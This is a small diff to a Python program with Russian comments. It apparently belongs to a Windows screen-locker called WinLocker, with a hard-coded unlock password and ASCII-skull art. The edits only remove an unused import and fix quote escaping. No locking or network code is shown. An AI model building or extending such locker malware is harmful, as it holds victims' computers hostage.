@@ -1,4 +1,4 @@
-import ctypes, os, sys, time, threading, random, math, tempfile, urllib.request
+import ctypes, os, sys, time, threading, random, tempfile, urllib.request
 
 # === НАСТРОЙКИ ===
 PASSWORD = "1601"
@@ -110,7 +110,7 @@ class WinLocker:
         self.canvas.delete("particle")
         # ASCII череп
         lines = [
-            "      .-"-.",
+            "      .-\"-.\"",
             "     /|6 6|\\",
             "    {/(_0_)\\}",
             "     _/ ^ \\_",
